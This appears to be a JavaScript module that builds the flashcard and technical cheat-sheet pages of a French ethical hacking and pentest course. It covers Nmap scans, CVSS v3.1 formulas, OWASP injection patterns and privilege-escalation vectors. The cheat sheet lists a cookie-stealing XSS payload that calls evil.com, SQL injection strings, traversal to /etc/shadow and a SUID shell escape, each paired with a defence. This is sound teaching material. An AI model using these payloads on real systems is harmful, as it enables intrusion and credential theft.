/**
 * Pages « cartes » (flashcards) et « formules » (mémento) du cours « Hacking Éthique & Pentest B3 ».
 */
'use strict';

const { crumb, cards } = require('../../../../scripts/course-kit');
const { chnav, disclaimer } = require('./helpers');

/* ======================== Cartes Flashcards ======================== */

function cartes(course, chapterList) {
  const crumbs = crumb(course, [
    { label: 'Accueil', href: '../index.html' },
    { label: 'Sommaire', href: '../sommaire.html' },
    { label: 'Cartes de révision' }
  ]);

  const modules = chapterList.map(ch => ({
    title: 'Module ' + ch.n + ' — ' + ch.short,
    items: ch.flashcards || []
  }));

  const body = [
    crumbs,
    '  <h1>Cartes de Révision &amp; Mémorisation Active — Hacking Éthique &amp; Pentest B3</h1>',
    '  <p class="lead">36 fiches synthétiques pour ancrer les concepts fondamentaux de la sécurité offensive et du pentest professionnel : Cadre légal (art. 323-1), Méthodologies PTES et OSSTMM, Scoring CVSS v3.1, Reconnaissance OSINT, Enregistrements DNS SPF/DKIM/DMARC, Sondes TCP Nmap, Protocoles SMB et SNMP, Failles OWASP (SQLi, XSS, LFI), Élévation de privilèges (GTFOBins, Sudoers, Buffer Overflows), Persistance et Rapports de Pentest.</p>',
    '',
    cards(modules),
    '',
    chnav({ href: '../sommaire.html', label: 'Sommaire général' }, { href: 'formules.html', label: 'Consulter le mémento technique' }),
    '',
    disclaimer()
  ].join('\n\n');

  return {
    'chapitres/cartes.html': {
      title: 'Cartes de révision — ' + course.brand,
      description: 'Flashcards de révision du cours Hacking Éthique & Pentest B3 : Cadre légal, OSINT, Scanning, OWASP, Élévation de privilèges et Reporting.',
      active: 'cartes',
      body
    }
  };
}

/* ======================== Formules & Mémento ======================== */

function formules(course) {
  const crumbs = crumb(course, [
    { label: 'Accueil', href: '../index.html' },
    { label: 'Sommaire', href: '../sommaire.html' },
    { label: 'Formules &amp; Mémento' }
  ]);

  const body = [
    crumbs,
    '  <h1>Mémento Technique &amp; Guide Opérationnel — Hacking Éthique &amp; Pentest B3</h1>',
    '  <p class="lead">Synthèse condensée des commandes Nmap indispensables, métriques CVSS v3.1, signatures d\'injection OWASP, vecteurs d\'escalade de privilèges GTFOBins et structure normalisée du rapport de test d\'intrusion.</p>',
    '',
    '  <h2>1. Les 5 Phases Fondamentales du Hacking Éthique (CEH &amp; PTES)</h2>',
    '  <table class="table">',
    '    <thead><tr><th>Phase</th><th>Objectif</th><th>Outils &amp; Techniques Clés</th><th>Livrable Associé</th></tr></thead>',
    '    <tbody>',
    '      <tr><td><strong>1. Reconnaissance</strong></td><td>Collecte passive et active d\'informations sur la cible sans interagir agressivement</td><td>OSINT, Shodan, Google Dorking, Whois, theHarvester, DNS (SPF/DMARC)</td><td>Cartographie de surface d\'attaque</td></tr>',
    '      <tr><td><strong>2. Scanning (Balayage)</strong></td><td>Identification des hôtes vivants, des ports ouverts, des services et des vulnérabilités</td><td>Nmap (SYN, TCP Connect, UDP), Nessus, OpenVAS, Nikto</td><td>Inventaire des ports et versions logicielles</td></tr>',
    '      <tr><td><strong>3. Gaining Access (Exploitation)</strong></td><td>Franchissement des défenses et prise de contrôle initiale du système ou de l\'application</td><td>Metasploit, Injections SQL (sqlmap), XSS, Burp Suite, Buffer Overflow</td><td>Preuve de concept (PoC) et premier accès shell</td></tr>',
    '      <tr><td><strong>4. Maintaining Access (Maintien)</strong></td><td>Élévation de privilèges, persistance et mouvement latéral vers d\'autres segments</td><td>LinPEAS, GTFOBins, sudoers NOPASSWD, Web shells, tunnels SSH, Chisel</td><td>Privilèges root / SYSTEM et persistance active</td></tr>',
    '      <tr><td><strong>5. Clearing Tracks (Dissimulation)</strong></td><td>Évaluation de la capacité de détection de la Blue Team et effacement des artefacts</td><td>Timestomp, analyse des logs d\'événements, règles Sigma, suppression d\'implants</td><td>Rapport d\'intrusion et plan de remédiation</td></tr>',
    '    </tbody>',
    '  </table>',
    '',
    '  <h2>2. Métriques et Calcul du Score CVSS v3.1 Base Score</h2>',
    '  <table class="table">',
    '    <thead><tr><th>Métrique</th><th>Nom Complet</th><th>Valeurs &amp; Poids Numériques</th></tr></thead>',
    '    <tbody>',
    '      <tr><td><strong>AV</strong></td><td>Attack Vector</td><td>Network (N=0.85), Adjacent (A=0.62), Local (L=0.55), Physical (P=0.20)</td></tr>',
    '      <tr><td><strong>AC</strong></td><td>Attack Complexity</td><td>Low (L=0.77), High (H=0.44)</td></tr>',
    '      <tr><td><strong>PR</strong></td><td>Privileges Required (Scope U)</td><td>None (N=0.85), Low (L=0.62), High (H=0.27)</td></tr>',
    '      <tr><td><strong>UI</strong></td><td>User Interaction</td><td>None (N=0.85), Required (R=0.62)</td></tr>',
    '      <tr><td><strong>C, I, A</strong></td><td>Confidentiality, Integrity, Availability</td><td>None (N=0.0), Low (L=0.22), High (H=0.56)</td></tr>',
    '    </tbody>',
    '  </table>',
    '  <div class="card card--info">',
    '    <h4>Formules Standardisées (Scope Unchanged \'U\')</h4>',
    '    <p><code>Exploitability = 8.22 * AV * AC * PR * UI</code><br>',
    '    <code>ISS = 1.0 - ((1.0 - C) * (1.0 - I) * (1.0 - A))</code><br>',
    '    <code>Impact = 6.42 * ISS</code><br>',
    '    Si <code>Impact &lt;= 0</code> : <code>BaseScore = 0.0 (NONE)</code> ; Sinon : <code>BaseScore = min(10.0, ceil((Impact + Exploitability) * 10) / 10)</code>.</p>',
    '  </div>',
    '',
    '  <h2>3. Commandes Fondamentales Nmap pour l\'Audit Réseau</h2>',
    '  <table class="table">',
    '    <thead><tr><th>Commande Nmap</th><th>Type de Balayage</th><th>Mécanisme &amp; Détection</th></tr></thead>',
    '    <tbody>',
    '      <tr><td><code>nmap -sS -p- -T4 &lt;cible&gt;</code></td><td>SYN Stealth Scan (demi-ouvert)</td><td>Envoie un paquet SYN, attend SYN+ACK (Open) ou RST (Closed). Rapide, discret.</td></tr>',
    '      <tr><td><code>nmap -sT -p 80,443 &lt;cible&gt;</code></td><td>TCP Connect Scan complet</td><td>Établit la poignée de mains 3-way complète. Utilisé sans privilèges root.</td></tr>',
    '      <tr><td><code>nmap -sU --top-ports 50 &lt;cible&gt;</code></td><td>UDP Scan</td><td>Sonde les services DNS (53), SNMP (161), DHCP (67/68). Plus lent que TCP.</td></tr>',
    '      <tr><td><code>nmap -sV -sC -O &lt;cible&gt;</code></td><td>Service Version, NSE &amp; OS</td><td>Bannières applicatives, scripts par défaut et empreinte de pile TCP/IP.</td></tr>',
    '      <tr><td><code>nmap -sA -p 22,80,443 &lt;cible&gt;</code></td><td>ACK Scan (Firewall mapping)</td><td>Sonde les règles de pare-feu avec état : RST = Unfiltered, Timeout = Filtered.</td></tr>',
    '    </tbody>',
    '  </table>',
    '',
    '  <h2>4. Vulnérabilités Web OWASP Top 10 &amp; Motifs d\'Injection</h2>',
    '  <table class="table">',
    '    <thead><tr><th>Vulnérabilité</th><th>Vecteur Typique</th><th>Mesure Défensive Efficace</th></tr></thead>',
    '    <tbody>',
    '      <tr><td><strong>Injection SQL (SQLi)</strong></td><td><code>\' OR 1=1 --</code> ou <code>UNION SELECT null, username, password FROM users--</code></td><td>Requêtes préparées (Prepared Statements), ORM paramétré, principe du moindre privilège DB.</td></tr>',
    '      <tr><td><strong>Traversée de Répertoire (LFI)</strong></td><td><code>../../../../etc/passwd</code> ou <code>%2e%2e%2fetc/shadow</code></td><td>Validation par liste blanche stricte, désactivation de l\'inclusion dynamique, chroot/jail.</td></tr>',
    '      <tr><td><strong>Cross-Site Scripting (XSS)</strong></td><td><code>&lt;script&gt;fetch(\'http://evil.com/?c=\'+document.cookie)&lt;/script&gt;</code></td><td>Échappement contextuel des sorties HTML, Content Security Policy (CSP), cookies <code>HttpOnly</code>.</td></tr>',
    '      <tr><td><strong>Contrôle d\'Accès (IDOR)</strong></td><td>Modification de paramètre d\'URL : <code>/api/user/1042</code> vers <code>/api/user/1001</code></td><td>Contrôle d\'autorisation côté serveur sur la session active à chaque requête.</td></tr>',
    '    </tbody>',
    '  </table>',
    '',
    '  <h2>5. Escalade de Privilèges Linux &amp; Windows</h2>',
    '  <table class="table">',
    '    <thead><tr><th>Système</th><th>Vecteur d\'Élévation</th><th>Commande d\'Énumération</th><th>Exploitation Type</th></tr></thead>',
    '    <tbody>',
    '      <tr><td><strong>Linux</strong></td><td>Binaires SUID anormaux</td><td><code>find / -perm -4000 -type f -exec ls -la {} + 2&gt;/dev/null</code></td><td>Recherche sur GTFOBins (ex: <code>find . -exec /bin/sh -p \\;</code>)</td></tr>',
    '      <tr><td><strong>Linux</strong></td><td>Droits sudoers NOPASSWD</td><td><code>sudo -l</code></td><td>Exécution directe de binaires à échappement (vim, find, bash)</td></tr>',
    '      <tr><td><strong>Linux</strong></td><td>Tâches planifiées non protégées</td><td><code>cat /etc/crontab /etc/cron.*/*</code></td><td>Modification de scripts appelés par root sans permissions restreintes</td></tr>',
    '      <tr><td><strong>Windows</strong></td><td>Chemins de services non quotés</td><td><code>wmic service get name,displayname,pathname,startmode</code></td><td>Injection de binaire dans les espaces de chemins non protégés par des guillemets</td></tr>',
    '      <tr><td><strong>Windows</strong></td><td>Privilèges de jetons (SeImpersonate)</td><td><code>whoami /priv</code></td><td>Attaques de type RottenPotato, SweetPotato ou PrintSpoofer vers SYSTEM</td></tr>',
    '    </tbody>',
    '  </table>',
    '',
    '  <h2>6. Structure Normalisée du Rapport de Pentest</h2>',
    '  <div class="card card--info">',
    '    <h4>Sections Incontournables d\'un Rapport Professionnel</h4>',
    '    <ol>',
    '      <li><strong>Page de garde &amp; Confidentialité :</strong> Titre du mandat, commanditaire, auditeurs, niveau de diffusion (TLP:AMBER / RESTREINT).</li>',
    '      <li><strong>Synthèse Managériale (Executive Summary) :</strong> Vulgarisation pour la direction, niveau de risque global, principales conclusions et impact métier.</li>',
    '      <li><strong>Méthodologie &amp; Périmètre :</strong> Adresses IP, URLs, créneaux horaires, règles d\'engagement contractuelles (RoE).</li>',
    '      <li><strong>Fiches Détaillées de Vulnérabilités :</strong> Titre, score CVSS v3.1, description technique, scénario d\'exploitation (PoC éthique), preuves (captures d\'écran/requêtes) et recommandation de remédiation.</li>',
    '      <li><strong>Plan d\'Action &amp; Feuille de Route :</strong> Priorisation des correctifs en trois horizons : Immédiat (&lt; 48 h), Court terme (&lt; 30 j) et Moyen terme (&lt; 90 j).</li>',
    '    </ol>',
    '  </div>',
    '',
    chnav({ href: 'cartes.html', label: 'Consulter les cartes mémo' }, { href: 'examens.html', label: 'Passer aux examens blancs' }),
    '',
    disclaimer()
  ].join('\n\n');

  return {
    'chapitres/formules.html': {
      title: 'Mémento technique & formules — ' + course.brand,
      description: 'Mémento opérationnel Hacking Éthique & Pentest B3 : Nmap, CVSS v3.1, OWASP Top 10, GTFOBins et structure de rapport.',
      active: 'formules',
      body
    }
  };
}

module.exports = { cartes, formules };
